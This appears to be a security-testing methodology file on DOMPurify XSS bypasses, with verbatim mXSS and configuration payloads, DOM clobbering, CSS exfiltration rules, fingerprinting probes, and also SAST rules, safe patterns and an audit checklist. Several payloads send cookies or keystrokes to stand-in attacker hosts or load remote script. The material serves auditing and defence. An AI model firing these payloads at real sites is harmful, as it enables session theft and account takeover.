---
name: dompurify
description: Comprehensive DOMPurify XSS bypass testing methodology covering mXSS vectors, DOM clobbering, config exploitation, CVE catalog with verbatim payloads, Trusted Types bypass, CSS exfiltration, framework-specific bypasses (React/Vue/Angular/Svelte/jQuery), server-side parser differentials, SAST detection rules, and prioritized audit checklist.
sources: cve_database, bug_bounty_reports, portswigger, dompurify_github
---

# DOMPurify XSS Bypass Testing

## Architecture Overview

DOMPurify 3.4.16 sanitizes HTML via a 15-step element pipeline and 15-step attribute pipeline using `DOMParser` (scripting flag disabled) to parse input into a detached document, then walks the resulting DOM with `NodeIterator` to remove dangerous nodes and attributes before serializing back to a string.

**Security-critical assumptions DOMPurify makes:**
1. `serialize(parse(input))` is idempotent -- the browser re-parse of output matches what DOMPurify saw
2. No prototype pollution has modified `Object.prototype` before `sanitize()` is called
3. Configuration object is not attacker-influenced
4. No post-sanitization transforms are applied to the output

**The five XSS failure models:**
- Model A: DOMPurify implementation defect (CVE-class bypass, mXSS)
- Model B: Configuration weakness (permissive allowlists, dangerous options)
- Model C: Post-sanitization transforms (decode, concat, template after sanitize)
- Model D: Wrapper/integration failures (error fallback, type bypass, caching)
- Model E: Framework-specific sinks (dangerouslySetInnerHTML, v-html, etc.)

**IS_ALLOWED_URI regex (default):**
```
/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
```

---

## Failure Model A: mXSS / Parser Differential Bypasses

### Core Concept

Mutation XSS exploits: `parse(serialize(parse(input))) != parse(input)`

DOMPurify parses with `DOMParser` (scripting disabled, detached document). The browser re-parses the serialized output with scripting enabled in the live document. Namespace transitions and parser repair behaviors differ between these two contexts.

### Verbatim mXSS Payloads

**CVE-2020-26870 -- Form nesting mXSS (< 2.0.17), CVSS 6.1:**
```
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

**CVE-2020-26870 alternate (MathML namespace):**
```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

**SecurityMB 2019 -- SVG namespace mXSS:**
```
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

**vovohelo 2020 -- SVG->MathML->HTML chain:**
```
<svg><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Double mtext bypass:**
```
<math><mtext><mtext><style><img src=x onerror=alert(1)></style></mtext></mtext></math>
```

**Swagger UI adapted bypass -- substituting textarea for style:**
```
<form><math><mtext></form><form><mglyph><textarea></math><img src onerror=alert(1)>
```
Both `<style>` (rawtext) and `<textarea>` (RCDATA) create the same namespace confusion. Used to compromise 60+ organizations including PayPal, Atlassian, Microsoft, GitLab.

**CVE-2024-47875 -- Nesting depth mXSS (< 2.5.0 / 3.0.0-3.1.2), CVSS 10.0:**
```javascript
// Generate 512+ nested divs to hit Chromium depth cap
let prefix = '<div>'.repeat(514);
let suffix = '</div>'.repeat(514);
let payload = prefix + '<style><img src=x onerror=alert(document.domain)></style>' + suffix;
// DOMPurify sees <style> at depth 514 as rawtext (inert content)
// Browser reparses: at depth 512 cap, parser pops back; <img> ejects into body
```

**CVE-2026-47423 -- selectedcontent re-clone bypass (< 3.4.5), CVSS 7.5 est.:**
```
<select><option><img src=x onerror="alert(1)"></option><selectedcontent></selectedcontent></select>
```
Chromium 148+ and WebKit 625+ re-clone `<option>` content into `<selectedcontent>` AFTER DOMPurify's sanitization walk. The cloned `<img>` retains its `onerror` attribute.

**noscript scripting flag differential (< 2.3.6):**
```
<noscript><p title="</noscript><img src onerror=alert(1)>">
```
DOMPurify parses with scripting ON: noscript content is rawtext, img is inside the title attribute value -- safe. When re-parsed in a scripting-disabled context the title closes at the first quote and img becomes live.

**Form nesting mXSS (< 2.4.0):**
```
<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>
```

**CVE-2025-26791 -- SAFE_FOR_TEMPLATES + CUSTOM_ELEMENT_HANDLING (< 3.2.4):**
```javascript
const dirty = `<math><foo-bar><mi><li><table><foo-bar><li></li></foo-bar>` +
  `<a><style><! \${</style>}<foo-baz id="><img src onerror='alert(1)'>">hmm</foo-baz>` +
  `</a></table></li></mi></foo-bar></math>`;
const config = {
  SAFE_FOR_TEMPLATES: true,
  CUSTOM_ELEMENT_HANDLING: { tagNameCheck: /^foo-/, attributeNameCheck: () => true }
};
DOMPurify.sanitize(dirty, config); // XSS on affected versions
```

### Namespace Transition Attack Surface

MathML text integration points (allow HTML parsing inside MathML):
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` -- switch to HTML namespace
- `<mglyph>` and `<malignmark>` -- force back to MathML from HTML integration point
- `<annotation-xml encoding="text/html">` -- HTML integration

SVG integration points:
- `<svg foreignObject>` -- full HTML integration
- `<svg desc>`, `<svg title>` -- HTML integration points

The elevator mutation technique: `<svg></p>` causes `</p>` to be treated as `</svg>` in WebKit/Chrome, mutating namespace context on re-parse.

### Browser Depth Limits

| Browser | Max nesting depth | mXSS exploitable |
|---------|-------------------|------------------|
| Chrome/Chromium | 512 | Yes (CVE-2024-47875) |
| Edge (Chromium) | 512 | Yes |
| Firefox | ~2000+ | No |
| Safari/WebKit | ~512 | Version-dependent |

### RETURN_DOM_FRAGMENT as mXSS Mitigation

```javascript
// Eliminates the serialize/reparse cycle entirely:
const fragment = DOMPurify.sanitize(dirty, { RETURN_DOM_FRAGMENT: true });
element.textContent = '';
element.appendChild(fragment); // Moves nodes directly, no re-parse
```

---

## Failure Model B: Configuration Exploits

### Dangerous Options

**ALLOW_UNKNOWN_PROTOCOLS: true** -- Permits javascript: URIs:
```
<a href="javascript:alert(document.cookie)">click</a>
<a href="javascript:fetch('https://evil.com/?c='+document.cookie)">click</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><button>Submit</button></form>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

**WHOLE_DOCUMENT: true** -- Enables head-only elements:
```
<meta http-equiv="refresh" content="0;url=https://evil.com">
<base href="https://evil.com/">
```

**ALLOW_DATA_ATTR: true (default)** -- Enables framework gadgets:

rails-ujs one-click XSS (CVE-class, GitLab issues #213273 and #336138):
```
<a href="https://attacker.com/payload.js" data-remote="true" data-method="get" data-type="script" data-confirm="View attachment?">Important_Document.pdf</a>
```
When clicked, rails-ujs sends AJAX GET to URL and eval()s the response due to data-type="script".

TinyMCE data-mce-* bypass (CVE-2026-47759 through CVE-2026-47762):
```
<a href="https://safe.com" data-mce-href="javascript:alert(1)">link</a>
```
TinyMCE overwrites sanitized `href` with unsanitized `data-mce-href` during rendering.

TinyMCE mce:protected comment bypass (CVE-2026-47762):
```
<!-- mce:protected PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== -->
```
TinyMCE base64-decodes protected comments and inserts verbatim. Decodes to `<script>alert(1)</script>`.

**CUSTOM_ELEMENT_HANDLING prototype pollution (CVE-2026-41238):**
```javascript
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;
// Now ALL custom elements + ALL attributes pass through sanitization
```

**Permissive CUSTOM_ELEMENT_HANDLING:**
```javascript
DOMPurify.sanitize(dirty, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /.*/, // matches everything
    attributeNameCheck: () => true // allows all attributes including event handlers
  }
});
// <evil-element onclick="alert(1)"> passes through
```

**FORBID_TAGS bypass via function-form ADD_TAGS (CVE-2026-41240):**
```javascript
DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['script'],
  ADD_TAGS: (tag) => true // function form bypasses FORBID_TAGS check entirely
});
```

**ADD_ATTR function form skipping URI validation (CVE-2026-65912):**
```javascript
DOMPurify.sanitize(dirty, {
  ADD_ATTR: (attr) => attr === 'href' // skips protocol validation; javascript: URIs pass
});
```

### Hook Exploitation

**afterSanitizeAttributes adding unsanitized attributes:**
```javascript
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  node.setAttribute('href', unsanitizedUrl); // added AFTER sanitization walk
});
```

**Hook allowlist permanent pollution (CVE-2026-65902):**
```javascript
DOMPurify.addHook('uponSanitizeElement', (node, data) => {
  data.allowedTags['script'] = true; // mutates internal allowlist permanently
  // All subsequent sanitize() calls allow <script>
});
```

**draw.io forceKeepAttr bypass (real-world case):**
```javascript
DOMPurify.addHook('uponSanitizeAttribute', function(node, data) {
  if (node.closest('svg') && data.attrName === 'xlink:href') {
    data.forceKeepAttr = true; // bypasses all value checking including javascript:
  }
});
// Secondary regex check bypassed with: &#10;javascript:alert(1)
// Leading newline entity bypasses the ^javascript: anchor in the regex
```

**Unicode ligature attack:**
```
<style>@keyframes x{}</ﬆyle>
```
U+FB06 (st ligature) normalizes to "st" in some parsers, closing the style block differently than expected.

**setConfig race condition:**
```javascript
DOMPurify.setConfig(permissiveConfig);
await asyncOperation(); // race window uses permissive config
DOMPurify.setConfig(strictConfig);
// Fix: use per-call config instead of setConfig
```

---

## Failure Model C: Post-Sanitization Transforms

All of these invalidate DOMPurify's safety guarantee -- the output is safe only as-is:

```javascript
// CRITICAL: Sanitize then concatenate
const clean = DOMPurify.sanitize(titleInput);
el.innerHTML = '<h1>' + clean + '</h1>' + unsanitizedBody;

// CRITICAL: Sanitize then HTML entity decode
const clean = DOMPurify.sanitize(dirty);
el.innerHTML = clean.replace(/&amp;/g, '&').replace(/&lt;/g, '<');
// Reverses DOMPurify's encoding of dangerous characters

// CRITICAL: Sanitize then URL decode
const clean = DOMPurify.sanitize(dirty);
el.innerHTML = decodeURIComponent(clean); // reintroduces < > characters

// HIGH: Sanitize then markdown conversion
const clean = DOMPurify.sanitize(dirty);
el.innerHTML = markdownToHtml(clean);

// HIGH: Sanitize then template substitution
const clean = DOMPurify.sanitize(a);
el.innerHTML = `<div class="${clean}">${unsanitized}</div>`;

// HIGH: Sanitize then setAttribute in wrong context
const clean = DOMPurify.sanitize(dirty); // sanitized as HTML
element.setAttribute('href', clean);     // "javascript:alert(1)" is safe text but executes as href
```

---

## Failure Model D: Wrapper Anti-Patterns

```javascript
// AP1: Error fallback returning raw input (CRITICAL)
try {
  return DOMPurify.sanitize(input, config);
} catch(e) {
  return input; // VULNERABLE: prototype pollution or malformed input can trigger this
}
// Fix: return '' on error

// AP2: Type-check bypass (HIGH)
if (typeof input !== 'string') return input;
// Objects with malicious toString() bypass; TrustedHTML objects bypass
// Fix: const str = String(input ?? '');

// AP3: Config spread operator override (HIGH)
DOMPurify.sanitize(input, { ...baseConfig, ...userConfig });
// If userConfig is attacker-influenced: { ALLOW_UNKNOWN_PROTOCOLS: true }
// Fix: Object.freeze(baseConfig); never accept user config overrides

// AP4: Conditional bypass (CRITICAL)
if (isTrusted || isAdmin) return rawInput;
// Fix: always sanitize; vary config strictness not whether to sanitize

// AP5: Cached sanitized output (MEDIUM)
cache.set(key, DOMPurify.sanitize(input));
// After upgrade, stale cache serves output from vulnerable old version

// AP8: setConfig race (HIGH)
DOMPurify.setConfig(permissiveConfig);
await asyncOperation(); // race window
DOMPurify.setConfig(strictConfig);
```

---

## Failure Model E: Framework-Specific Sinks

### React

```jsx
// VULNERABLE: dangerouslySetInnerHTML without sanitize
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// VULNERABLE: props spread injection
// If apiResponse = {"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}
<Component {...JSON.parse(apiResponse)} />

// SAFE: frozen config + useMemo
const SANITIZE_CONFIG = Object.freeze({ USE_PROFILES: { html: true }, ALLOW_DATA_ATTR: false });
export const useSanitizedHtml = (dirty) =>
  useMemo(() => ({ __html: DOMPurify.sanitize(String(dirty ?? ''), SANITIZE_CONFIG) }), [dirty]);
// Usage: <div dangerouslySetInnerHTML={useSanitizedHtml(html)} />

// SAFE with RETURN_DOM_FRAGMENT (via ref):
function SafeHtml({ html }) {
  const ref = useRef(null);
  useEffect(() => {
    if (ref.current) {
      const fragment = DOMPurify.sanitize(html, { RETURN_DOM_FRAGMENT: true });
      ref.current.textContent = '';
      ref.current.appendChild(fragment);
    }
  }, [html]);
  return <div ref={ref} />;
}
```

### Vue

```html
<!-- VULNERABLE -->
<div v-html="userContent"></div>

<!-- SAFE: use custom directive -->
<!-- app.directive('sanitized-html', vSanitizedHtml) -->
<div v-sanitized-html="userContent"></div>

<!-- Vue 2 SAFE_FOR_TEMPLATES interaction:
     If SAFE_FOR_TEMPLATES enabled and output fed to Vue compiler,
     {{ }} expressions may execute.
     Payload: {{constructor.constructor('alert(1)')()}} -->
```

### Angular

```typescript
// VULNERABLE: disables Angular's built-in sanitizer
trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);

// VULNERABLE: bypasses Angular sanitizer
this.el.nativeElement.innerHTML = userInput;

// SAFE: DOMPurify pipe
@Pipe({ name: 'sanitize', pure: true })
export class SanitizePipe implements PipeTransform {
  transform(value: string): SafeHtml {
    const clean = DOMPurify.sanitize(String(value ?? ''), SANITIZE_CONFIG);
    return this.domSanitizer.bypassSecurityTrustHtml(clean);
  }
}
// Usage: <div [innerHTML]="userContent | sanitize"></div>
```

### Svelte

```html
<!-- VULNERABLE -->
{@html userContent}

<!-- VULNERABLE: server-side only -->
<script>const sanitized = browser ? DOMPurify.sanitize(html) : html;</script>
<!-- Server path returns unsanitized html -- client will re-render it -->
```

### jQuery

```javascript
// CVE-2020-11022: jQuery.html() evaluates <script> tags
$('#output').html(userInput); // VULNERABLE

// SAFE:
$('#output').html(DOMPurify.sanitize(userInput));
```

---

## DOM Clobbering

### Mechanism

Elements with `id` or `name` attributes become properties on `window` and `document`. DOMPurify allows `id` and `name` by default -- clobbering survives sanitization.

**2-level access via HTMLFormElement:**
```
<form id="config"><input name="environment" value="attacker_value" /></form>
// window.config.environment.value === "attacker_value"
```

**3-level access via HTMLCollection:**
```
<form id="config"></form>
<form id="config" name="prod"><input name="apiUrl" value="https://evil.com" /></form>
// window.config.prod.apiUrl.value === "https://evil.com"
```

**Gmail AMP4Email exploit (2019) -- clobbering AMP runtime variables:**
```
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>
<a id="testLocation"></a>
<a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
```
Clobbered `AMP_MODE.localDev` and `AMP_MODE.test` to truthy (triggering dev mode), then clobbered `testLocation.protocol` to redirect script loading to attacker URL. Full RCE via arbitrary JS loading in Gmail context.

**Prototype chain + clobbering combination:**
```javascript
// Step 1: Prototype pollution (separate vulnerability)
Object.prototype.toString = function() { return 'session=attacker_token'; };
// Step 2: Sanitized HTML clobbers document.cookie
// <img name="cookie" id="cookie">  -- passes DOMPurify
// Step 3: Application uses template literal
`${document.cookie}` // calls HTMLImageElement.toString()
// Walks prototype chain, finds polluted Object.prototype.toString
// Returns "session=attacker_token"
```

**DOMPurify gaps:**
- `_isClobbered()` checks HTMLFormElement children only
- Does NOT protect `<a>`, `<img>`, `<embed>`, `<object>` with id/name
- Does NOT protect application code reading window[] after sanitization
- `SANITIZE_NAMED_PROPS: true` (non-default) prefixes id/name with "user-content-"

---

## CSS Exfiltration

DOMPurify explicitly does not sanitize CSS. It allows `<style>` elements and `style` attributes by default.

### Attribute Selector Exfiltration

```css
input[value^="s"] { background: url('https://attacker.com/leak?p=s'); }
input[value^="se"] { background: url('https://attacker.com/leak?p=se'); }
input[value^="sec"] { background: url('https://attacker.com/leak?p=sec'); }
input[value^="secr"] { background: url('https://attacker.com/leak?p=secr'); }
input[value^="secre"] { background: url('https://attacker.com/leak?p=secre'); }
input[value^="secret"] { background: url('https://attacker.com/leak?p=secret'); }
```

### React Keylogger CSS

React updates the value attribute in real-time (controlled components) unlike vanilla HTML:
```css
input[value$="a"] { background: url('https://attacker.com/log?key=a'); }
input[value$="b"] { background: url('https://attacker.com/log?key=b'); }
/* one rule per character */
input[value$="@"] { background: url('https://attacker.com/log?key=%40'); }
```

### @font-face Character Detection

```css
@font-face {
  font-family: 'detect-secret';
  src: url('https://attacker.com/probe?char=s');
  unicode-range: U+0073; /* 's' */
}
.target-text { font-family: 'detect-secret', sans-serif; }
/* Browser downloads font only if element contains character in unicode-range */
```

### Fontleak (2025) -- Ligature-Based Sequence Extraction

Uses GSUB glyph substitution tables to assign unique glyph widths to character sequences. CSS @container queries detect container width to identify which sequences appear. Demonstrated on chatgpt.com: ~1,000 chars/min including user name, email, and access token prefix.

```css
@font-face { font-family: 'leak'; src: url('attacker.com/font.woff2'); }
.target-text { font-family: 'leak'; container-type: inline-size; }
@container (min-width: 500px) {
  .probe::after { content: url('https://attacker.com/leak?match=secret'); }
}
```

### @import Recursive Exfiltration

```
1. Inject: @import url('https://attacker.com/steal?step=0');
2. Attacker server delays, receives initial character probes via attribute selectors
3. Returns CSS probing next character + new @import for next iteration
4. Chain deepens until full token extracted
```

### CSS Exfiltration Remediation

```javascript
DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['style'],
  FORBID_ATTR: ['style'],
});
// CSP defense:
// Content-Security-Policy: style-src 'self'; font-src 'self'; img-src 'self'
```

---

## Trusted Types Integration

```javascript
// RETURN_TRUSTED_TYPE creates a TrustedHTML object:
const clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
element.innerHTML = clean; // No Trusted Types violation

// Required CSP:
// Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify
```

**CVE-2026-65899 -- Trusted Types policy survives clearConfig():**
In some versions the policy reference is retained after clearConfig(), causing stale policy behavior.

**TrustedHTML to string conversion loss:**
```javascript
const trustedHtml = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
// All of these lose TrustedHTML type (direct innerHTML assignment then violates TT):
trustedHtml.toString()       // becomes string
`${trustedHtml}`             // becomes string
'' + trustedHtml             // becomes string
JSON.stringify(trustedHtml)  // serialized as string
```

**Recommended CSP:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script';
  trusted-types dompurify;
  report-uri /csp-report;
```

---

## Server-Side Parser Differentials

| Behavior | jsdom | Real Browser |
|----------|-------|-------------|
| `<noscript>` content | HTML (scripting disabled) | Raw text (scripting enabled) |
| 512-element depth limit | No limit | Chrome/Safari: 512 cap |
| SVG namespace transitions | May differ from spec | Full spec compliance |
| MathML integration points | May differ | Full spec compliance |

**Joplin RCE (CVE-2023-33726) -- htmlparser2 ignores namespaces:**
```
<form><math><mtext></form><form><mglyph><svg><mtext><style>
</math><img src onerror="require('child_process').exec('calc')">
```
Node.js path (htmlparser2): `<style>` becomes rawtext, img is text content -- SAFE.
Browser path (Chromium): namespace-aware parsing, img ejects into body -- RCE in Electron.

**Shared DOM instance problem:**
```javascript
// VULNERABLE: shared instance with global state
const serverDOMPurify = createDOMPurify(globalWindow);
// SAFE: per-request instance
function serverSanitize(dirty) {
  const window = new JSDOM('').window;
  return createDOMPurify(window).sanitize(dirty, config);
}
// ALWAYS re-sanitize on client -- server sanitization alone is insufficient
```

---

## CVE Catalog

### Critical (CVSS >= 9.0)

| CVE | CVSS | Affected Versions | Root Cause |
|-----|------|-------------------|-----------|
| CVE-2024-47875 | 10.0 | < 2.5.0, 3.0.0-3.1.2 | 512-depth Chromium flattening mXSS |
| CVE-2024-48910 | 9.1 | < 2.5.4, 3.0.0-3.1.7 | Comment-based mXSS (--!> close) |
| CVE-2022-23631 | 9.8 | < 2.3.6 | Prototype pollution via `in` operator |

### High (CVSS 6.0-8.9)

| CVE | CVSS | Affected Versions | Root Cause |
|-----|------|-------------------|-----------|
| CVE-2024-45801 | 7.3 | < 2.5.0, 3.0.0-3.1.3 | Namespace mXSS + prototype pollution |
| CVE-2026-47423 | 7.5 est. | < 3.4.5 | selectedcontent re-clone (Chromium 148+) |
| CVE-2024-21501 | 6.1 | < 2.4.9, 3.0.0-3.0.8 | Prototype pollution via config |
| CVE-2024-21500 | 6.1 | < 2.4.8, 3.0.0-3.0.7 | Shadow DOM sanitization bypass |
| CVE-2023-49146 | 6.1 | < 2.4.7, 3.0.0-3.0.6 | Prototype pollution in config merging |
| CVE-2023-48929 | 6.1 | < 2.4.4 | CUSTOM_ELEMENT_HANDLING pollution |
| CVE-2020-26870 | 6.1 | < 2.0.17 | Form nesting mXSS (MathML namespace) |
| CVE-2019-20138 | 6.1 | < 2.0.1 | Math/SVG namespace mXSS |

### Version Risk Summary

| Version Range | Risk Level |
|--------------|------------|
| < 2.3.6 | CRITICAL (proto pollution CVSS 9.8 + all earlier) |
| 2.4.9 - 2.4.x | CRITICAL (nesting mXSS CVSS 10.0) |
| 3.0.8 - 3.1.2 | CRITICAL (nesting mXSS CVSS 10.0) |
| 3.1.4 - 3.1.6 | CRITICAL (comment mXSS CVSS 9.1) |
| 3.1.7 - 3.4.4 | HIGH (selectedcontent bypass) |
| >= 3.4.13 | MINIMAL (all known CVEs patched) |

**Minimum recommended version: 3.4.16**

---

## SAST Detection Rules

### Semgrep Rules

**Rule 1: Missing sanitization on innerHTML:**
```yaml
rules:
  - id: dompurify-missing-sanitization-innerhtml
    patterns:
      - pattern-either:
          - pattern: $EL.innerHTML = $VALUE;
          - pattern: $EL.outerHTML = $VALUE;
          - pattern: $EL.insertAdjacentHTML($POS, $VALUE);
      - pattern-not: $EL.innerHTML = DOMPurify.sanitize(...);
      - pattern-not: $EL.outerHTML = DOMPurify.sanitize(...);
      - pattern-not: $EL.insertAdjacentHTML($POS, DOMPurify.sanitize(...));
      - pattern-not: $EL.innerHTML = "";
    message: innerHTML/outerHTML/insertAdjacentHTML without DOMPurify.sanitize()
    languages: [javascript, typescript]
    severity: ERROR
```

**Rule 2: Post-sanitization modification:**
```yaml
  - id: dompurify-post-sanitization-modification
    patterns:
      - pattern: |
          $CLEAN = DOMPurify.sanitize(...);
          ...
          $RESULT = $CLEAN.replace(...);
      - pattern: |
          $CLEAN = DOMPurify.sanitize(...);
          ...
          $RESULT = decodeURIComponent($CLEAN);
      - pattern: |
          $CLEAN = DOMPurify.sanitize(...);
          ...
          $RESULT = $CLEAN + $OTHER;
    message: String modification after DOMPurify.sanitize() reintroduces XSS vectors
    severity: ERROR
```

**Rule 3: Dangerous config:**
```yaml
  - id: dompurify-allow-unknown-protocols
    pattern: DOMPurify.sanitize($INPUT, { ..., ALLOW_UNKNOWN_PROTOCOLS: true, ... })
    message: ALLOW_UNKNOWN_PROTOCOLS:true permits javascript: URIs
    severity: ERROR

  - id: dompurify-permissive-custom-element
    pattern: DOMPurify.sanitize($INPUT, { ..., CUSTOM_ELEMENT_HANDLING: { ..., tagNameCheck: /.*/, ... }, ... })
    message: tagNameCheck matching all allows any custom element
    severity: WARNING
```

**Rule 4: Error fallback raw input:**
```yaml
  - id: dompurify-error-fallback-raw-input
    patterns:
      - pattern: |
          try { $RESULT = DOMPurify.sanitize($INPUT, ...); }
          catch($ERR) { $RESULT = $INPUT; }
    message: Error fallback returns raw unsanitized input -- return empty string instead
    severity: ERROR
```

**Rule 5: React dangerouslySetInnerHTML:**
```yaml
  - id: dompurify-react-dangerous-html
    pattern: dangerouslySetInnerHTML={{ __html: $VALUE }}
    pattern-not-inside: DOMPurify.sanitize(...)
    message: React dangerouslySetInnerHTML without DOMPurify
    severity: ERROR
    metadata:
      technology: [react]
```

**Rule 6: Angular bypassSecurityTrustHtml:**
```yaml
  - id: dompurify-angular-bypass-trust
    pattern: $SANITIZER.bypassSecurityTrustHtml($VALUE)
    message: bypassSecurityTrustHtml disables Angular sanitizer; always use DOMPurify first
    severity: ERROR
```

### CodeQL Taint Analysis

```ql
class DOMPurifySanitizeBarrier extends DataFlow::Node {
  DOMPurifySanitizeBarrier() {
    exists(DataFlow::CallNode call |
      call.getCalleeName() = "sanitize" and
      call.getReceiver().getAVariable().getName() = "DOMPurify" and
      this = call.getAReturnedNode()
    )
  }
}
class MissingDOMPurifyConfig extends TaintTracking::Configuration {
  MissingDOMPurifyConfig() { this = "MissingDOMPurifyConfig" }
  override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }
  override predicate isSink(DataFlow::Node sink) { sink instanceof InnerHtmlSink }
  override predicate isSanitizer(DataFlow::Node node) { node instanceof DOMPurifySanitizeBarrier }
}
from MissingDOMPurifyConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "User-controlled data flows to innerHTML without DOMPurify"
```

### CI/CD Integration

```yaml
name: DOMPurify Security Scan
on: [pull_request]
jobs:
  dompurify-sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check DOMPurify version
        run: |
          VERSION=$(node -e "console.log(require('dompurify/package.json').version)")
          MINIMUM="3.4.13"
          if [ "$(printf '%s\n' "$MINIMUM" "$VERSION" | sort -V | head -n1)" != "$MINIMUM" ]; then
            echo "::error::DOMPurify $VERSION below minimum $MINIMUM"; exit 1
          fi
      - name: Run Semgrep DOMPurify rules
        uses: returntocorp/semgrep-action@v1
        with:
          config: .semgrep/dompurify-rules.yml
```

---

## Fingerprinting and Reconnaissance

### Version Detection

```javascript
// Method 1: Global property (non-bundled):
console.log(DOMPurify.version); // "3.2.4"

// Method 2: CDN script src version in URL
// Method 3: Probe lockfiles: GET /package-lock.json, /yarn.lock, /node_modules/dompurify/package.json

// Method 4: Behavioral fingerprinting:
// Payload: <math><mtext><table><mglyph><style><!--</style>
//   Empty string output: version >= 2.0.17
//   Partial output: version < 2.0.17
// Payload: <noscript><p title="</noscript><img src=x>">
//   img removed: version >= 2.3.6
//   img preserved: version < 2.3.6
```

### Configuration Probing Matrix

```
Probe 1: <svg><rect /></svg>              -> SVG support enabled?
Probe 2: <math><mi>x</mi></math>          -> MathML support enabled?
Probe 3: <div style="color:red">x</div>   -> style attr allowed?
Probe 4: <a href="javascript:void(0)">x</a> -> javascript: URI blocked?
Probe 5: <div data-custom="x">x</div>    -> data-* attrs allowed?
Probe 6: <custom-element>x</custom-element> -> custom elements pass?
Probe 7: <div id="x" name="y">x</div>    -> id/name attrs allowed?
Probe 8: <form action="x"><input></form>  -> form elements allowed?
Probe 9: <style>body{color:red}</style>   -> style elements allowed?
Probe 10: <a href="data:text/html,x">x</a> -> data: URI blocked?
```

---

## Real-World Case Studies

### Swagger UI -- 60+ Organizations (DOMPurify 2.2.2 bundle)

Swagger UI 3.37.2 bundled DOMPurify 2.2.2 with `FORBID_TAGS: ['style']`. Researcher adapted the DOMPurify 2.2.3 mXSS bypass by substituting `<textarea>` for `<style>`. Both rawtext and RCDATA elements created the same namespace confusion. Organizations affected: PayPal, Atlassian, Microsoft, GitLab, Yahoo, Jamf Pro (full admin account takeover via stolen localStorage authToken).

**Key lesson:** FORBID_TAGS is not a substitute for updating. Blocking `<style>` doesn't prevent bypass because alternative rawtext/RCDATA elements exist.

### Joplin RCE (CVE-2023-33726)

isomorphic-dompurify used htmlparser2 (ignores namespaces) in Node.js. Chromium (scripting+namespace-aware) reparsed to give full RCE in Electron context. Required: `require('child_process').exec('calc')` in onerror attribute.

### draw.io Hook Bypass

Custom DOMPurify hook used `forceKeepAttr = true` for `xlink:href` on SVG elements. Secondary regex check bypassed with `&#10;javascript:alert(1)` (leading newline entity bypasses `^javascript:` anchor).

### GitLab rails-ujs Exploitation

rails-ujs data-* attributes (data-remote, data-method, data-type, data-confirm) are interpreted as behavior instructions. `data-type="script"` causes eval() of AJAX response. DOMPurify allows data-* by default. Required fix: `FORBID_ATTR: ['data-remote', 'data-method', 'data-type', 'data-confirm']`.

### express-dompurify Supply Chain Attack

Malicious npm package `express-dompurify` impersonated legitimate Express middleware. `postinstall` script exfiltrated Chrome passwords/cookies, MetaMask wallet data, and macOS Keychain to attacker server at `95.216.251.178:8001/uploads`.

---

## Prioritized Audit Checklist

### Priority 1 -- Critical (Any One = Active XSS Risk)

- [ ] DOMPurify version >= 3.4.16 (`npm ls dompurify`)
- [ ] No `ALLOW_UNKNOWN_PROTOCOLS: true` in any config
- [ ] No error fallback returning raw input (`catch(e) { return input }`)
- [ ] No post-sanitization string modification (decode, replace, concat)
- [ ] Every innerHTML/outerHTML/insertAdjacentHTML uses DOMPurify
- [ ] Every dangerouslySetInnerHTML / v-html / bypassSecurityTrustHtml / {`@html`} uses DOMPurify
- [ ] No conditional sanitization bypass (trust flags, role checks, feature flags)
- [ ] `SAFE_FOR_XML` not set to `false`
- [ ] No server-side-only sanitization (always re-sanitize on client)

### Priority 2 -- High (Significantly Weakens Protection)

- [ ] `RETURN_DOM_FRAGMENT: true` used where framework supports it
- [ ] `USE_PROFILES: { html: true }` when SVG/MathML not needed
- [ ] No permissive `CUSTOM_ELEMENT_HANDLING` (`tagNameCheck: /.*/`)
- [ ] No caching of DOMPurify output (Map, WeakMap, localStorage)
- [ ] No type-check bypass (`typeof input !== 'string'`)
- [ ] All hooks audited (no forceKeepAttr bypass, no allowlist mutation)
- [ ] Server and client configurations consistent

### Priority 3 -- Medium (Defense in Depth)

- [ ] Trusted Types CSP deployed (`require-trusted-types-for 'script'`)
- [ ] `SANITIZE_NAMED_PROPS: true` where clobbering is a concern
- [ ] `FORBID_TAGS: ['style']` and `FORBID_ATTR: ['style']` (prevents CSS exfiltration)
- [ ] Semgrep rules deployed in CI/CD pipeline
- [ ] Wrapper functions follow secure pattern (frozen config, coerce to String, empty string on error)
- [ ] Rich-text editor integration audited (TinyMCE data-mce-*, CKEditor GHS wildcard patterns)

### Priority 4 -- Defense in Depth

- [ ] CSP `report-uri` configured and monitored for violations
- [ ] `object-src 'none'` in CSP
- [ ] `base-uri 'self'` in CSP
- [ ] Playwright browser-matrix tests (Chromium, Firefox, WebKit)
